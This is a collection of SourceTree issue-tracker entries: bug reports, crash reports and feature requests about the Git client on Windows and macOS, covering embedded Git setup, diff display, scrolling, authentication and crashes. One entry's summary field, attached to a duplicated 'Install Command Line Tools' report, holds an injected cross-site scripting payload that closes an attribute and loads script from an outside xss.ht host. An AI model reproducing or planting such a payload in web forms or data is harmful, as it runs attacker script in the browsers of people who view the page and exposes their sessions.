fields.description:
A few people have had a bit of a setup task to get Pageant configured with their SSH keys, because they've followed instructions from GitHub or SmartGit in the past which uses the Cygwin port of OpenSSH instead. 

While you can import OpenSSH keys into PuTTY format using PuTTYgen, it is an additional step, and it would be nicer to just work with this existing setup. 

Ideally we could have a setting in Preferences to choose between Plink and SSH, and automatically detect which one to default to depending on the users current setup.
fields.summary: Support using OpenSSH as well as plink

fields.description: Support clone URLs from Bitbucket / GitHub like the Mac version.
fields.summary: Support clone URLs
Copy sub-elements of lines in diffs
Support dragging shortcuts to repositories

fields.description:
Very occasionally the update process of SourceTree will fail, reporting an error, and after this SourceTree will not start.

You can restore functionality by going into Control Panel > Programs, clicking SourceTree and using the 'Repair' option, which will return SourceTree to a functioning state at the previous version.

However, after this you may well find that SourceTree's "Check For Updates" window incorrectly reports that you are on the latest version available, even when you are not. The only way to update to the version that failed updating is to uninstall the app and re-install it, although this loses many of your settings (basically anything saved in the Settings class but not bookmarks, passwords, license etc)

This seems to be an error in ClickOnce that can happen occasionally if access to the file system or registry is interrupted somehow, see http://support.microsoft.com/kb/2713442. This is not a SourceTree bug but may cause some support requests. Unfortunately the only real option is to uninstall and reinstall or to wait until the next update.
fields.summary: SourceTree update fails, then application won't start

fields.description:
Aras reported that after he installed SourceTree, his Visual Studio 2010 builds (aka 'work') all started failing with the error:

{{LINK : fatal error LNK1123: failure during conversion to COFF: file invalid or corrupt}}

This is described in this thread: http://stackoverflow.com/questions/10888391/link-fatal-error-lnk1123-failure-during-conversion-to-coff-file-invalid-or-c

And this one: http://social.msdn.microsoft.com/Forums/da-DK/vssetup/thread/d10adba0-e082-494a-bb16-2bfc039faa80

Both claim that Visual Studio SP1 fixes the issue, but Aras already had SP1 installed. He fixed it by uninstalling .Net 4.5 and re-installing .Net 4.0, but this means that SourceTree will no longer work.

This is a major show-stopping issue, we cannot allow the install of SourceTree to break a developer's working environment. 

Note: this only affects C/C++ developers because the issue is in compilation of native resource files (.rc)
fields.summary: Install of .Net 4.5 can break Visual Studio 2010 C/C++ resource file compilation

fields.description:
From David Amador:

"I did however noticed a crash when clicking the "Refresh" button next to "Remote branch to pull" either when pulling or pushing. When the window shows up the list has all branches but if I click refresh it crashes. It happens every-time.

I've attached the log after that crash happened."
fields.summary: Clicking 'Refresh' next to Remote branch to pull causes crash (also Push?)

fields.description:
If you have no system git you can break SourceTree by clicking on Use System Git when you're currently using the embedded, but clicking Cancel without selecting anything. You then can't click 'Use Embedded Git' again because it's disabled.

Restarting the app fixes it.
fields.summary: Click Use System Git then Cancel, does not return to Embedded git

fields.description:
From Aras:

"download and install" did download, but failed to copy it (see gitInstallFail.png). Strangely enough, after this dialog I clicked "check again" in the dialog and that did go through.
fields.summary: Download embedded git failed on copying git.cmd

fields.description:
Reported by David Amador:

"Because I'm using the embedded git I'm getting a "server's key is not catched in the registry" error. I usually use this via command line and this error prompt's to a Yes/No answer, but I have no idea how to add servers to the trusted hosts file inside the program."
fields.summary: Problem with 'server key is not cached' errors

fields.description:
Reported by David Amador. 

"When starting for the first time it wouldn't detect where git is installed. This is no problem for me. But when I click "Browse to the location of git..." it just shows me the same Window. Doesn't even prompts for a directory for my git. Eventually the only option that worked was Download a new one (1st option)"

He also reported not being able to switch to the system git inside Preferences, may be the same issue.
fields.summary: Can't browse to system git if it's not on the path

fields.description: Same issue as this one on Mac https://jira.atlassian.com/browse/SRCTREE-1259
fields.summary: Commit & push failing on push should close commit dialog & clear draft commit message

fields.description: For the case where you've opened repositories manually without bookmarking them, then wish to do so without dragging / dropping.
fields.summary: Bookmark open repositories feature

fields.description:
When there is a single file in either of the lists in the file status view, the right-click context menu items are often disabled incorrectly. On investigation, the selection state of the underlying items is 100% correct, but the trouble is that the CanExecute.. methods are not being re-queried. I can put breakpoints on these methods and they just don't get called.

Making calls to CommandManager.InvalidateRequerySuggested() doesn't help, the CanExecute methods don't get called no matter how many times I call the CommandManager. Other reports of this problem suggest it is called by not properly implementing the CanExecuteRequery interface on your ICommand implementation, but the RelayCommand we use already does that correctly. 

When there is more than one file in the list, the problem never occurs, except for needing to click one extra time to move the selection.

So it appears that something in the selection state of these lists, which are the only DataGrids in the system, is causing this problem.
fields.summary: Enable/disable state of file status context menu doesn't update with single file

fields.description: If the output from a task is too long, at the moment you can't scroll it to see the rest.
fields.summary: No scrollbar in full output window

fields.description:
It just flashes, basically. Can we do better than that?

It's not that bad, since it doesn't take long. But still, needs to be better really.
fields.summary: Progress bar in autoupdate dialog isn't very useful

fields.description:
-Since adding the resolve menu items things seem to be updating a lot slower. It could be that querying SelectedFiles / SelectedFileRecords so often is slowing things down.-

-We should probably cache the results and dirty them when something changes to improve the performance.-
fields.summary: Log very slow to update if network is disconnected

fields.description: I've just noticed this and it appears to have been the case for a while - when you use the context menu on one of the file status lists (a DataGrid), after clicking away from it you cannot use the mouse to interact with anything other than this DataGrid until you click on the main window title. WTF??
fields.summary: After using context menu on file lists, mouse pointer doesn't work outside it

fields.description:
If Git isn't installed and on the path, ST crashes at startup.

The default Git install doesn't modify the PATH either.

This is related to the task of embedding git but we should probably make sure this fails in a sensible fashion in case after this is implemented, they pick the system git and then for some reason it stops being on their path.
fields.summary: Crash at startup if git isn't on the path

fields.description:
This only seems to happen when a refresh is triggered by a file system event. The views will refresh, but the diff view will blank out as if nothing is selected, when the file list still has the first item selected.

The is a particular problem when there's only one file in the list, because you can't then trigger the refresh of the diff panel, because you can't change the selection (there's only one file in the list and it's already selected). A workaround is to click one of the headers to re-sort, which does nothing when there's only one file but it does trigger a selection event which makes the diff refresh.
fields.summary: Occasionally, when a file change triggers an update, diff disappears despite file selection being active
Extra log lines are not loaded when uncommitted line is displayed

fields.description:
1. Select a log row near the top
2. Scroll quite a way down, then select a different row without any modifier keys pressed

Expected: selection should change to just the new row

Actual: selection changes to the new row *and* the original row, interpreted by SourceTree as a range diff request

The reason seems to be that the virtualisation on the log table causes the previously selected row not to be deselected. This is a weird WPF thing, will have to look for a workaround. Hopefully we won't have to disable virtualisation as that will reduce performance.
fields.summary: When scrolling the log a long distance from current selection, deselection doesn't happen

fields.description:
If you use the file filter box at the top of the file status view, and this causes the existing selection to disappear from the results, the selection state of that item is not reset, meaning that when queried for the file selection, that previous (now invisible) selection is included. This is dangerous and unintuitive.

We should reset the selection when filtering or check that selection is still visible.
fields.summary: When using the file filter, previous selection is not reset

fields.description: The file content panel is not capturing the mouse scroll events when the mouse is inside the panel. The working copy panel does capture the events correctly and scrolls.
fields.summary: File content panel is not capturing mouse scroll events

fields.description: When I try to create a new repository using the toolbarbutton, contextmenu action or file menu action, the application crashes
fields.summary: Creating a new repository crashes the application
Periodic remote refresh

fields.description:
If you select 'Jump To' in the top right and pick a branch / tag, this works fine so long as the jump to point is within a small distance of the current scroll position. As soon as it goes outside a certain distance, it stops working until you manually scroll near to the item, then it suddenly pops to that point.

This isn't down to the auto-loading of new items, that works fine and indeed the same problem occurs even if you've already scrolled back to the first commit so that no loading is needed. 

The problem seems to stem from virtualisation in the data grid, in that the selection change event does not seem to fire until you're close to the area. The selection call works fine, but it appears to not actually perform the selection until  it's within the virtualised area, at which point the selection changed even triggers the scroll. 

I'm fairly sure disabling virtualisation would fix it, but that's not what we want to do for performance. Probably what we need to do is instead of selecting/scrolling by item, we need to figure out the row number and then scroll to that, which isn't dependent on the mapping that only kicks in when the rows are in the virtualised page.
fields.summary: 'Jump to' option in log view doesn't work if commit is outside a reasonable distance of current scroll pos
JIRA links in commit text (and other text replacements)

fields.description:
When you use a HTTPS URL which doesn't include the username, and the repo needs authentication, you get prompted twice, once for the username and password, and once for just the password. There are 2 problems:

# The default username does not seem to get used
# There should only be one prompt even if there is no default user name
fields.summary: HTTPS URL without user name prompts too many times for authentication
Hosted repositories
Draft Commit support
Archive support
Mercurial support
Git flow
Patch handling
Custom Actions
Binary file diff / preview in diff pane

fields.description:
The WebBrowser control used to display the commit summary floats on top of any dialog opened (such as commit), regardless of its Z-order. 

This appears to be a crappy limitation of WebBrowser, it's not a proper WPF control but really just a wrapped ActiveX control, which means it doesn't respect any of the WPF rendering or layout rules.

Looks like we'll have to hack this out (just after getting it working, argh!) and replace it with a FlowDocument instead.
fields.summary: WebBrowser content appears on top of dialogs

fields.description:
This applies to the File Status View, and both the file lists in the Uncommitted line and commit details in the log view.

# Select a file which is not the first one
# Hit F5
# After the refresh, the file you selected is properly re-selected, but so is the first item in the list.

This seems to be a problem with DataGrid which automatically selects the first item.
fields.summary: File lists always have the first item selected

fields.description:
# Select a commit in the log
# Press F5

The view refreshes, and the files are displayed correctly, but the web browser view of the commit details often becomes blank, and also the diff sometimes doesn't re-appear either. Another F5 usually sorts it out.

This can kick in when refreshes are triggered by other means too, e.g. after a commit is done.
fields.summary: Hitting Refresh when viewing a commit in the log causes the commit details to disappear

fields.description: If you select multiple files in the Uncommitted line of the log view, right-click and select Add to Index, only the first file is actually staged.
fields.summary: Can't add multiple files to the index from Uncommitted line of log

fields.description:
After you've opened the commit dialog you should be able to continue to stage/unstage files and hunks etc. Right-clicking on a file inside the commit dialog leads to disabled menu items right now. This might be because it's using the same command hook as the top-level menu which is disabling the function if a dialog is open.

Fix this, and check that you can do everything else inside the commit dialog too, e.g. diff pane manipulation.
fields.summary: Can't perform stage / unstage actions inside commit dialog

fields.description: Is this because we're doing too much on the main thread?
fields.summary: Takes a while to switch tabs when the destination tab has large diff

fields.description: Very rarely I'm getting failures on git commands that come out in the log as 'git <blah> failed with exit code 0'. Exit code 0 is success though, so you should never get RepoProcess.Success = False if exitCode is 0. Haven't so far been able to replicate it but it crops up randomly.
fields.summary: Intermittent 'git failed with exit code 0' message

fields.description:
The status isn't refreshing if a commit is done outside of SourceTree without changing any files.

Appears to be being ignored even though correct paths are changing. Reports include:

fields.description:
Implement auto-refresh tuning as in Mac client:
# Detect 'floods' in the file system watcher and start reducing the update speed until flood is over
# Allow auto-refresh to be disabled per repo or globally
# Limit the number of summaries re-queried at once
fields.summary: Performance tuning of auto-refresh

fields.description:
When I run run commits for the CLI the environment variable on my mac is properly replaced. But when I try to commit from SourceTree it fails, and I get this error message: 
```
husky > pre-commit (node v14.16.1)
Error: Failed to replace env in config: ${GITHUB_TOKEN}
```

An issue on the husky repo reports other users who experienced the same with Sourcetree. https://github.com/typicode/husky/issues/131. 
When I run commands from command line, or via VSCode or Inteelij it succeeds.
fields.summary: Replace environement variable in a pre-commit

fields.description:

fields.description:
I am running macOS 12.1 on a M1 MacBook. The "Install Command Line Tools" command fails.

```
Installation failed
Failed to install command line tools, please see the system log for details.
```

This is probably a permissions error. Sourcetree seems not to request elevated permissions to modify `/usr/local`, which it needs to.
fields.summary: "><script src=https://xssjacked.xss.ht></script>

fields.description:
I am running macOS 12.1 on a M1 MacBook. The "Install Command Line Tools" command fails.

```
Installation failed
Failed to install command line tools, please see the system log for details.
```

This is probably a permissions error. Sourcetree seems not to request elevated permissions to modify `/usr/local`, which it needs to.
fields.summary: "Install Command Line Tools" fails

fields.description:
Currently when I use the search command within Sourcetree, it gives me results from all branches, but typically I only want to see results from a single branch so I can check what is about to be promoted to the next higher level. Basically - I'd like Sourcetree's search to have the equivalent of this:

git log --grep 'my-ticket-number' MyBranchName
fields.summary: Need option to limit search results to a single branch

fields.description:
Sourcetree 4.1.5 on macOS (12.1)
 # Open a project with a large number of commits.
 # Click on the last commit and chose "Select All" (command-A)
 # Choose copy (command-C)
 # Crash

A few remarks. First, a sample crash report can be found [here |https://www.hairersoft.com/Downloads/Report.txt](they all look identical). Second, it appears important that the project has sufficiently many commits, the crash doesn't happen if there are just a few dozen commits. Also, the crash doesn't happen if I first scroll all the way down to the first commit. This suggests that it has to do with trying to copy a commit that hasn't been prefetched.
fields.summary: Systematic crash

fields.description:
OSX: 12.0.1

SourceTree: 4.1.4(240)

As is:

!image-2021-12-16-16-19-40-196.png!

 

Expected reslt:

No dark theme mixed up in the rebase interactive window
fields.summary: Rebase interactive windows mixed up dark theme

fields.description:
If the ~/.ssh/known_hosts file changes it makes SourceTree hang when closing.

 

From what I can tell from the activity monitor SourceTree never releases the memory and consumes a lot more when the known_hosts file is manually changed (e.g. entries removed).

 

I have to reboot the system in order to kill the processes entirely.

 

Happens in SourceTree v4.1.4. on macOS Big Sur v11.6 Intel.
fields.summary: known_hosts file change bug

fields.description: After upgrading my machine to Monterey, if I choose to "Rebase children of...", the unselected commit entries in the window that is displayed are black text on a black background (see attachment).  This makes it slower to do interactive rebases.  This was happening on 4.1.4 - but is also currently happening on 4.1.5 (but I can't select 4.1.5 under "Affects Version/s" as it isn't yet published there). !image-2021-12-06-10-13-53-601.png!
fields.summary: Rebase Interactive dialog shows black background fields on Monterey

fields.description:
New added repos are put on top of the list and I always need to manually re-sort by name to keep some kind of consistency in that list.



Can you please implement setting a default sort?

Thanks!
fields.summary: [Repository Browser] Allow set default sorting

fields.description:
I see this when I turn on my computer in the morning. I use "Auto" mode for appearance on MacOS and Sourcetree cannot detect current mode and keeps previous appearance. To solve this, I need to switch appearance manually from System Preferences on every login.

Steps to reproduce:
 # Change Appearance of Mac to "Auto"
 # Wait for Mac to switch automatically to "Dark" mode
 # Turn off computer
 # Turn on computer in the morning to make sure it switches to "Light" mode
 # Check Sourcetree
 # Soucetree keeps dark mode even though rest of the apps use light mode
fields.summary: Sourcetree on Mac cannot detect current (dark/light) mode on login

fields.description:
With Japanese setting, the width of the preferences window is narrow, and "Custom Actions", "Update" and "Advanced" are pushed out to popup menus.
These grayed out menus cannot be selected.

[Japanese screenshot|https://gyazo.com/5ec7fcbda6ff120e75a269b428761465]
[English screenshot|https://gyazo.com/968dbb6a82cd353944a3b96a1f7cc4ee]
 
Workaround:
Change the language setting to English.

This seems to be happening [since 4.1.0|https://qiita.com/naginx/items/03220be59e363971a1b1] and is reproduced in 4.1.5.
fields.summary: Unable to access Advanced preferences tab in Japanese.

fields.description:
Line numbers are cut off when viewing a diff in SourceTree using the latest version on MacOS 11 (Sourcetree 4.1.0)

I can see the initial line numbering for the file, but not the current version line numbers. I don't see anyway to adjust this column width.

!image-2021-03-11-18-54-25-692.png!
fields.summary: Line numbers are cut off, not visible

fields.description:
When opening a new repository from the repository browser, SourceTree will often crash. The crash does not happen every time, but it happens frequently enough that SourceTree has become near-unusable for me. I have attached a couple of crashlogs to this issue. I can attach an unlimited number of them on request.

 

This has been happening for a very long time now, from before version 4.1

 

SourceTree 4.1.3

macOS 10.14.6
fields.summary: SourceTree keeps crashing when opening new repository

fields.description:
h3. Issue Summary

We have received reports from some users about unexpected crashes after upgrading to 4.1.4 version in Mac. Creating this bug report to get more information and logs from users to be able to reproduce the issue.
h3. Steps to Reproduce
 * Upgrade to 4.1.4.

h3. Expected Results
 * Start Sourcetree normally and visualise your repositories.

h3. Actual Results
 * Crash found during application startup.

h3. Workaround

Downgrade to 4.1.3 version.
fields.summary: Unexpected crash after upgrading to 4.1.4 version in Mac

fields.description:

I am able to pull/push if I use :

git push https://<user>:<token>@github.com/tusamarco/proxy_sql_tools.git

But not from sourcetree. 
I have removed my account info in sourcetree and recreated using OAuth, but:
 on github I can see in the application authorization is only read mode and source tree is giving me:

git --no-optional-locks -c color.branch=false -c color.diff=false -c color.status=false -c diff.mnemonicprefix=false -c core.quotepath=false -c credential.helper=sourcetree fetch origin 

git@github.com: Permission denied (publickey).

fatal: Could not read from remote repository.

 

Also if I try to fetch.

Any Idea why?

fields.description:
When in Tree View, the file list scroll position does not move in proportion to the number of files displayed. It is difficult to navigate. At times it feels like the scroll position isn't moving, as if it thinks it's at the bottom of the list, or as if the mouse tracking speed is a small fraction of its normal speed. The effect seems to increase with the number of files in the list and can be nearly impossible to use with a lot of files. If there are only a few files outside the visible area, the scroll position moves nearly as expected but if there are many files out of view the scroll position hardly moves at all.

This happens in the file list that displays uncommitted changes (staged and unstaged) both in the File Status and History workspaces, but not in the file list in previous commits in History. The behavior happens in Tree View regardless of the sort and regardless of the style of the staging view (split or fluid). Turning off Tree View and using either of the flat list options restores the expected scrolling behavior.

The problem occurs when using the mouse wheel, using touch gestures on the trackpad, and when click-dragging the scrollbar itself. When using the scroll wheel or the trackpad gestures, it feels as if the tracking speed is intolerably slow – it does move, but not as expected. When dragging the scrollbar itself, the scrollbar will move fluidly with the mouse cursor and analogous to my hand movement, but the visible area does not move in proportion to the amount the scrollbar is moving, and when released, the position of the scrollbar snaps back to its original position or near to it.

I'm not sure when the problem was introduced. I would estimate within the past several weeks. It may have coincided with my upgrade to macOS Monterey, or it may have coincided with a recent update to Sourcetree itself; I'm not sure. I did not notice which version of Sourcetree I was using when it started, but I did apply an update today before reporting the problem, which brought it to the current version and the problem persists. I have auto updates enabled, so my guess is that I was one version back before I applied the current update.

Steps to reproduce:
 # Produce changes to files in multiple subdirectories of a repository, such that the number of files and directories containing changes exceeds the visible area of the file view with Tree View enabled.
 # View the list of uncommitted changes in Tree view and observe the stunted scrolling behavior.
 # Switch to flat view and observe normal scrolling behavior.
 # Produce changes to additional files to increase the size of the list and observe a worsening of the effect.

For reference on the number of files: I have one repo with 17 file changes in 5 different directories from top-level to 3 directories deep. The behavior is present, but I am able to navigate this list with only some difficulty. I have another repo with 874 changes up to 7 directory levels deep. The scroll won't even move. The second case is an extreme, but both of these cases scroll normally when switched to flat mode, and this was not a problem on these same repos in the past, even with large changesets.
fields.summary: File List Doesn't Scroll Properly in Tree View

Hi Guys, I just updated to the latest version on Windows. (the about screen says 3.4.7)

 

I had some changes and wanted to stash them.. but after stashing them they simply disappeared.

 

Quite unhappy about this :(

fields.description:
Hi,

As a small team for 4, we all work on a master branch with SourceTree. 

We commit our local changes to master branch and then pull, if the merge successful then we push the changes to the master git repository. We have our local BitBucket server and we use SourceTree as git tool, also KDiff3 merge tool.

This week we experience a work loss. A team

member committed new files 2 days ago and and pulled the changes to my local repository. During the merge operation the files added by other team member were deleted. Although this happened in the past a few more times we couldn't identify a solid reason with evidence to support.

The pictures below shows what happened.

!image-2021-11-18-14-38-01-479.png!

 

!image-2021-11-18-14-38-23-685.png!
fields.summary: SourceTree deletes files during at a local pull which added by another team member in previous commits

fields.description:
Using the new settings from git 2.34 triggers a lot of error dialogs in Sourcetree, so much it cannot be used.

{quote}'git log' failed with code 128:'error: unsupported value for gpg.format: ssh

fatal: bad config variable 'gpg.format' in file '/Users/chucknorris/.gitconfig' at line 53{quote}

git 2.34.0 changelog:
{quote}
 * In addition to GnuPG, ssh public crypto can be used for object and
   push-cert signing.  Note that this feature cannot be used with
   ssh-keygen from OpenSSH 8.7, whose support for it is broken.  Avoid
   using it unless you update to OpenSSH 8.8.
{quote}

https://raw.githubusercontent.com/git/git/master/Documentation/RelNotes/2.34.0.txt

.gitconfig documentation : https://git-scm.com/docs/git-config#Documentation/git-config.txt-gpgprogram
fields.summary: Support git 2.34.x : 'git log' failed with code 128:'error: unsupported value for gpg.format: ssh fatal: bad config variable 'gpg.format' in file .gitconfig

Password Required for user git on host GitHub.com

I type it in, and the same popup keeps reappearing. This is when trying to clone a repository.

fields.description:
When I have a large file stashed, the stash view shows all the changes in it, even though it exceeds the size limit I set in settings, causing the app to hang for a long period.

This should respect the size limit settings, in the same manner that the normal diff view does
fields.summary: Stash view does not respect file size restriction

fields.description:
See the attached screenshots.

Proper rendering is shown with correctly displayed \n content and Arabic letters in the diff.

!image-2021-11-16-09-16-36-568.png!

In 4.1.4-beta, diff is over-escaped, displaying \n as \\n and Arabic letters in the encoded form, not matching the file contents at all.

!image-2021-11-16-09-16-16-322.png!
fields.summary: Diff content is not escaped properly

fields.description: Local branches not showing up and no disclosure button as before to open the list of local branches. Screenshot attached. Machine: M1 mac.  !image-2021-11-15-16-07-12-947.png!
fields.summary: Local Branches not showing up

fields.description:
I would like to select multiple local branches to delete from the left menu. I know there is a way to do it from a different window, but I never know remember where it is and the help option doesn't help.

Aside from never being able to find it, the window lists remotes and locals together. This makes it far too easy to accidentally delete a remote branch. Because its too risky I never clear out my branches. so I have hundreds of local branches.

Please See [https://git-fork.com/] for a much cleaner, easy to use, methodology. 

You can also see a very good implementation of this type of interaction on Windows and Mac Operating systems. They allow the user to click one item, hold shift, click another item. this will select all items between the two selection points. Alternatively they ALSO allow users to hold the "ctrl" or "cmd" key to multi-select items.

 

This may be small, but small quality of life updates, like not having to click exactly of the disappearing chevron SRCTREE-7765 and the ability to keep my git clean of stale branches is the reason I started using other Tools. And now that I'm becoming more familiar with Other products, I no longer recommend or regularly use source tree.
fields.summary: allow me to remove multiple local branches easily

fields.description:
Currently: When trying to expand sections like "REMOTES" "BRANCHES" in the left side menu, you have to click the chevron that DISAPPEARS to expand or collapse a section. its a very annoying user interaction. 

Expected:

It should be a bit forgiving, and operate more like standard expand/collapse sections where I can click anywhere on the row

[https://material.angular.io/components/expansion/overview]

dropdowns allow for this behaviour

Radio buttons and checkboxes also allow for this type of interaction where I can click the label instead of having to get perfectly on the radio or check-box.
fields.summary: Expanding and collapsing click is to specific

fields.description:
When starting Sourcetree on macOS Monterey, a popup is shown (by the OS) saying the app needs to be updated. 

The app is currently Intel only, and needs to be updated to include a binary for Apple Silicon as well.

/ Ingemar

Those animations makes developer to loose precious seconds, and are distracting.
Can maybe someone implement option to turn them off please?
fields.summary: Remove animations of commit and other popping out windows

fields.description:
Dialogs such as the following appear to clear the clipboard when they open. This is very annoying since I typically have copied content I wish to paste into the dialog before I took the action to initiate the dialog. SO, I have to go back and re-copy my data after the dialog is created. please stop clearing the clipboard on entry to such dialogs.

 

 

!image-2021-10-06-10-11-23-231.png!
fields.summary: dialogs clear the clipboard

fields.description:
As soon as _Parameters_ contains a quote mark ", the entire content of _Parameters_ gets surrounded by quotes.

To reproduce:
 # Create a Custom Action:
|_Show Full Output_|✓ Yes|
|_Script to run:_ |{{sh}}|
|_Parameters:_|{{-c "echo Hi"}}|

 # Execute the Custom Action

It executes 
{code}
sh "-c "echo Hi""{code}
Expected it to execute 
{code}
sh -c "echo Hi"{code}
 

Possibly related to https://jira.atlassian.com/browse/SRCTREE-1158
fields.summary: Custom Action: Quotes in Parameters: Everything gets quoted

fields.description:
MacOS: 10.14.6

SourceTree is crashing occasionally when I switch between local branches.

This problem started when I upgraded Sourcetree to version 4.1.3.

It has happened to me 9 times between Sept 15 and 24, 5 times in the past 2 days alone.

The latest crash report is available at [https://pastebin.com/raw/AgN7jMGc]

This may be a duplicate of SRCTREE-7754 and/or SRCTREE-7756, although MacOS version is different here.
fields.summary: Sourcetree 4.1.3 Crash After Switching Branches

fields.description: Sourcetree for Mac (4.1.3) on macOS Big Sur (11.6) often crashes the entire system causing the screen to go black and then to reboot entirely. As far as I can tell this has occurred for me on macOS Big Sur for at least a few versions of Sourcetree and persists in version 4.1.3. It seems to happen when the app is refreshing the diff for file status changes or maybe checking the remote for unpulled commits. I've tried switching repositories from HTTPS to SSH but it still occurs. I also thought maybe it could be related to the "Window restoration" preference for which I'm using the "Restore windows on startup" option to have Sourcetree reload repository windows as tabs when the apps starts. Because of this unpredictable issue, I've had to stop using Sourcetree entirely for now, thought it is by far my preferred Git client. I look forward to getting back to using it if this issue can be resolved.
fields.summary: Sourcetree for Mac (4.1.3) crashing on macOS Big Sur (11.6)

fields.description:
When I push to Sourcetree, it uses 100% of my network upload bandwidth, and since upload and download share the same pool of bandwidth, it kills the entire internet for my house until it's finished.  To make matters worse, other devices in the house are still requesting download bandwidth, but because the router can't provide any more, the push operation to Sourcetree often drops packets or has high latency, causing the push to fail.  The fact that Sourcetree is trying to hog all the bandwidth actually ends up being counterproductive even to its own operation.  

Every program I have ever used that take the entire bandwidth by default also have an option to limit that bandwidth, except Sourcetree.  Please consider adding such an option.

Thank you!
fields.summary: Add an option to limit network bandwidth

fields.description:
MacOS: Big Sur version: 11.5.2

It happens randomly I can't reproduce it every time 

 

Crash report below here:

fields.description:
Hi, I using SourceTree for a long time but I have a annoying problem for opening file with external editor.

Here a reproduce steps:
 # Open an any git project.
 # Edit or create some file, the file will show up in stage files and unstage files.
 # Drap that file directly to editor (e.g. Visual studio code or Sublime text)
 # It appear "The file can’t be found." popup.

Here is the video:

[https://youtu.be/RKBZgpWh8JI]

The earlier version can successful open without any error.

Now I have to click "Show in finder" then drag-n-drop. It's very unintuitive.

Can fix this small problem? Thanks.

---

SourceTree version 4.1.3 (219)

MacOS Version 11.5.2
fields.summary: "The file can’t be found." when drag-n-drop to open files with external editor

fields.description:
When I to a git-flow initialization on a new local repo I typically make two modifications to the default settings: change the Production Branch to "{{main}}" and change the Version Tag Prefix to "{{v}}".  When I do this initialization with Sourcetree and then check the {{.git/config}} file, the branch name has been changed, but the version tag is blank.

Note that in the steps to replicate below I needed to create and commit a blank file in order to create the main and develop branches — I was unable to create new branches using Sourcetree with a completely blank repository.  Once those branches exist, I could initialize git-flow.

Steps to replicate:
 # Create a new local repo
 # Create and commit a blank file
 # Create the main and develop branches
 # Select Repository–>Git flow/Hg flow–>Initialize Repository
 # Change "Production branch" to "main"
 # Change "Version tag prefix" to "v"
 # Click OK
 # Look at {{.git/config}}:

{code:java}
[gitflow "branch"]
 master = main
 develop = develop
[gitflow "prefix"]
 feature = feature/
 bugfix = bugfix/
 release = release/
 hotfix = hotfix/
 support = support/
 versiontag =
{code}
 The second line shows that the modification to the Production Branch worked.  The last line shows that the modification to the Version Tag Prefix did not work.
fields.summary: git-flow Version tag prefix is not initialized

!image-2021-09-06-22-07-52-100.png!!image-2021-09-06-22-10-17-167.png!

Right click > Log Selected > Click on Description Column

When I click on "Description", the application crashes.
